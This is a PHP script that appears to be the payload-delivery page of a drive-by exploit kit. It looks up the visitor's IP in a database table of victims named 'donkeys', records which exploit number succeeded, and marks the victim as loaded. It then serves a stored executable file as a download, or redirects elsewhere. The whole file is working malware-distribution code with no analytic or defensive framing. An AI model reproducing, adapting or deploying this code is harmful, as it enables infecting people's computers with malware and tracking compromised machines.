<?php

//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
header("Cache-Control: no-cache, must-revalidate");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
include("./secure/config.php");
mysql_connect($config['MysqlHost'], $config['MysqlUser'], $config['MysqlPassword']) or die("Could not connect to mysql server.");
mysql_select_db($config['MysqlDbname']) or die("Could not select database.");


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
if (mysql_query("UPDATE `donkeys` SET `status` = 'LOAD', `exploit` = '" . intval($_GET['e']) . "' WHERE `ip` = INET_ATON('" . mysql_real_escape_string($_SERVER['REMOTE_ADDR']) . "') AND `status` = 'NOT'")){
	if ($row = mysql_fetch_array(mysql_query("SELECT `donkeys`.`file` AS `id`, `files`.`name` AS `name` FROM `donkeys`, `files` WHERE `donkeys`.`ip` = INET_ATON('" . mysql_real_escape_string($_SERVER['REMOTE_ADDR']) . "') AND `donkeys`.`file` = `files`.`id`"))){
		$file_data = @file_get_contents("./secure/files/" . $row['id']);
		header("Accept-Ranges: bytes\r\n");
		header("Content-Length: " . strlen($file_data) . "\r\n");
		header("Content-Disposition: inline; filename=" . $row['name']);
		header("\r\n");
		header("Content-Type: application/octet-stream\r\n\r\n");
		echo $file_data;
		exit();
	} else {
		header("Location: " . $config['FinishRedirect']);
	}
} else {
	header("Location: " . $config['FinishRedirect']);
}

//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
mysql_close();

?>